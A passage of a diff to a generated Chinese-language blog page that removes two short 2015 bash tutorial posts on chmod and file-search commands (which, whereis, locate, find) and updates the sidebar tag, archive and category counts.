-<h3 id="给脚本添加执行权限">给脚本添加执行权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意路径</span></span><br><span class="line">chmod +x ./example.sh</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">chmod <span class="number">1</span> ./example.sh</span><br><span class="line"><span class="comment">#chmod </span></span><br><span class="line"><span class="comment"># 4  read | 2  write |  1 executive</span></span><br></pre></td></tr></table></figure>
-<h3 id="参考">参考</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/15/2015/bash2/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/15/2015/bash2/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/14/2015/bash1/" title="bash基本命令1---命令/文件查询" itemprop="url">bash基本命令1---命令/文件查询</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-13T16:00:00.000Z" itemprop="datePublished"> 发表于 10-14-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="文件查看">文件查看</h3><p>file [-bLvz] 文件</p>
-<h3 id="命令搜寻">命令搜寻</h3><p>which [-a] 命令<br>-a all</p>
-<h3 id="文件搜寻">文件搜寻</h3><h4 id="1-whereis_[-bmsu]_file/folder//基于数据库">1.whereis [-bmsu] file/folder//基于数据库</h4><p>-b binary only<br>-m manual only<br>-s source only<br>-u except above three<br>//不过似乎home文件不能查找..没卵用 drop it</p>
-<h4 id="2-locate_[-ir]_keyword">2.locate [-ir] keyword</h4><p>-i ignore uppercase/lowercase<br>-r using regexp<br>//可以进行日常查找,支持home等路径</p>
-<h4 id="3-_find">3. find</h4><p>find [Router] [option] [action]<br>time-&gt;<br>    -mtime n/+n/-n (n 为 number)<br>-newer file : 列出一个比file更新的文件<br>example:<br>    find tools -mtime 0 //24小时之内tools文件夹更改的地方<br>高级功能,按路径查找:<br>    find /etc/ password -mtime 0</p>
-<h3 id="小提示&amp;&amp;结论">小提示&amp;&amp;结论</h3><p><code>updatedb</code>可以更新搜索的datebase</p>
-<p>locate优点可以使用正则<br>find可以基于时间/路径查找</p>
-<p>三者选择:<br>    <code>find&gt;locate&gt;whereis</code></p>
-<h3 id="参考">参考</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/14/2015/bash1/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/14/2015/bash1/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next<span></span></a>
@@ -775,7 +805,7 @@ noauto          开机不自动挂载
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Sites/" style="font-size: 10px;">Sites</a> <a href="/tags/Wall/" style="font-size: 10px;">Wall</a> <a href="/tags/bash/" style="font-size: 13.33px;">bash</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/git/" style="font-size: 10px;">git</a>
+       <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 13.33px;">MySQL</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Sites/" style="font-size: 10px;">Sites</a> <a href="/tags/Wall/" style="font-size: 10px;">Wall</a> <a href="/tags/bash/" style="font-size: 13.33px;">bash</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/书记/" style="font-size: 10px;">书记</a>
     </div>
   </div>
 
@@ -783,7 +813,7 @@ noauto          开机不自动挂载
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">16</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">2</span></li></ul>
   </div>
 
 
@@ -805,11 +835,11 @@ noauto          开机不自动挂载
 		  
 		
 		  
-			<li><a href="/categories/SQL/" title="SQL">SQL<sup>1</sup></a></li>
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
 		  
 		
 		  
-			<li><a href="/categories/Web/" title="Web">Web<sup>11</sup></a></li>
+			<li><a href="/categories/Web/" title="Web">Web<sup>12</sup></a></li>
 		  
 		
 		  
